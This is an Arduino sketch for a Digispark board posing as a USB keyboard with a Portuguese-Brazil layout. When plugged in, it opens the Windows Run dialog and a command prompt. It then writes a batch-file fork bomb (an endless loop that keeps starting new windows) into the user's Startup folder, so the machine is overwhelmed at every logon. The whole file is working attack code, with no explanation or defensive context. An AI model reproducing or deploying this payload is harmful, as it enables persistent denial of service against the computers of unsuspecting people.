#include "DigiKeyboardPtBr.h"
void setup() {  
}

void loop() {  
    digitalWrite(1, HIGH); // LED on <--> Action start
    DigiKeyboardPtBr.sendKeyStroke(0);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.print("cmd");
    DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.print(F("echo for /l %%x in (0, 0, 0) do start > \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fork.bat\""));
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardPtBr.delay(500);
    DigiKeyboardPtBr.print("exit");
    DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);    
    digitalWrite(1, LOW); // LED off <--> Action end
    for(;;){ /*empty*/ }    
}
